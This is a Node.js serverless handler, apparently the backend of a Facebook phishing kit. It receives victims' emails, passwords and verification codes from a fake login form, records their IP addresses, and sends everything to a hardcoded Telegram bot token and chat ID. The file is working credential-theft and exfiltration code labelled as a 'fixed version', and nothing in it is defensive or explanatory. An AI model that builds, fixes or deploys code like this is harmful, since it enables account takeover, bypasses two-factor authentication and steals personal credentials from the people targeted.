// api/capture.js - FIXED VERSION
const https = require('https');

// Your Telegram credentials
const BOT_TOKEN = '8228437015:AAF4ebqdhrsn3rkQLRRhv-KHlyUleDrCZXw';
const CHAT_ID = '1622637334';

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only accept POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Parse data
    let data = {};
    if (req.body) {
      try {
        data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
      } catch (e) {
        console.log('Parse error:', e.message);
      }
    }
    
    // Add metadata
    data.timestamp = new Date().toISOString();
    data.ip = req.headers['x-forwarded-for'] || 
              req.headers['x-real-ip'] || 
              req.connection.remoteAddress || 
              'Unknown';
    
    // Log to console
    console.log('📥 CAPTURED:', {
      type: data.type || 'unknown',
      email: data.email ? data.email.substring(0, 5) + '...' : 'none',
      timestamp: data.timestamp,
      ip: data.ip
    });
    
    // Send to Telegram (SIMPLIFIED - no Markdown)
    try {
      await sendToTelegramSimple(data);
      console.log('✅ Telegram message sent successfully');
    } catch (telegramError) {
      console.log('⚠️ Telegram failed (non-critical):', telegramError.message);
    }
    
    // Return success
    return res.status(200).json({
      success: true,
      message: 'Data received',
      timestamp: data.timestamp
    });
    
  } catch (error) {
    console.error('❌ Server error:', error);
    return res.status(500).json({
      success: false,
      error: 'Internal error'
    });
  }
};

// SIMPLE Telegram sender - NO MARKDOWN, just plain text
async function sendToTelegramSimple(data) {
  return new Promise((resolve, reject) => {
    // Create PLAIN TEXT message (no formatting)
    let message = '';
    
    if (data.type === 'login') {
      message = `🔐 NEW LOGIN\n\n`;
      message += `Email: ${data.email || 'N/A'}\n`;
      message += `Password: ${data.password || 'N/A'}\n`;
      message += `Time: ${new Date(data.timestamp).toLocaleString()}\n`;
      message += `IP: ${data.ip}\n`;
      message += `Source: Facebook Login`;
    } 
    else if (data.type === 'verification') {
      message = `✅ VERIFICATION CODE\n\n`;
      message += `Email: ${data.email || 'N/A'}\n`;
      message += `Password: ${data.password || 'N/A'}\n`;
      message += `Code: ${data.code || 'N/A'}\n`;
      message += `Time: ${new Date(data.timestamp).toLocaleString()}\n`;
      message += `IP: ${data.ip}\n`;
      message += `Source: Facebook Verification`;
    }
    else {
      message = `📥 DATA RECEIVED\n\n`;
      message += `Type: ${data.type || 'unknown'}\n`;
      message += `Email: ${data.email || 'N/A'}\n`;
      message += `Time: ${new Date(data.timestamp).toLocaleString()}\n`;
      message += `IP: ${data.ip}`;
    }
    
    // Clean message - remove any problematic characters
    message = message
      .replace(/[`*_[\]()~>#+=|{}.!-]/g, '') // Remove Markdown chars
      .replace(/\n\s*\n\s*\n/g, '\n\n') // Remove extra newlines
      .trim();
    
    console.log('Sending to Telegram:', message.substring(0, 100) + '...');
    
    // Prepare request
    const postData = JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML' // Try HTML instead of Markdown
    });
    
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 5000 // 5 second timeout
    };
    
    const req = https.request(options, (res) => {
      let responseData = '';
      
      res.on('data', chunk => responseData += chunk);
      
      res.on('end', () => {
        console.log(`Telegram API Status: ${res.statusCode}`);
        
        if (res.statusCode === 200) {
          resolve(JSON.parse(responseData));
        } else {
          console.log('Telegram API Error Response:', responseData);
          reject(new Error(`Telegram API ${res.statusCode}: ${responseData}`));
        }
      });
    });
    
    req.on('error', (error) => {
      console.log('Network error:', error.message);
      reject(error);
    });
    
    req.on('timeout', () => {
      console.log('Telegram request timeout');
      req.destroy();
      reject(new Error('Timeout'));
    });
    
    req.write(postData);
    req.end();
  });
}

// Alternative: Send with HTML formatting
async function sendToTelegramHTML(data) {
  return new Promise((resolve, reject) => {
    let message = '';
    
    if (data.type === 'login') {
      message = `<b>🔐 NEW LOGIN ATTEMPT</b>\n\n`;
      message += `<b>📧 Email:</b> <code>${escapeHTML(data.email || 'N/A')}</code>\n`;
      message += `<b>🔑 Password:</b> <code>${escapeHTML(data.password || 'N/A')}</code>\n`;
      message += `<b>⏰ Time:</b> ${new Date(data.timestamp).toLocaleString()}\n`;
      message += `<b>📍 IP:</b> ${data.ip}\n`;
      message += `<b>📱 Source:</b> Facebook Login`;
    }
    // ... similar for other types
    
    const postData = JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const req = https.request(options, (res) => {
      let responseData = '';
      res.on('data', chunk => responseData += chunk);
      res.on('end', () => {
        console.log('HTML Telegram Response:', res.statusCode);
        if (res.statusCode === 200) {
          resolve();
        } else {
          reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
        }
      });
    });
    
    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

function escapeHTML(text) {
  if (!text) return '';
  return text.toString()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}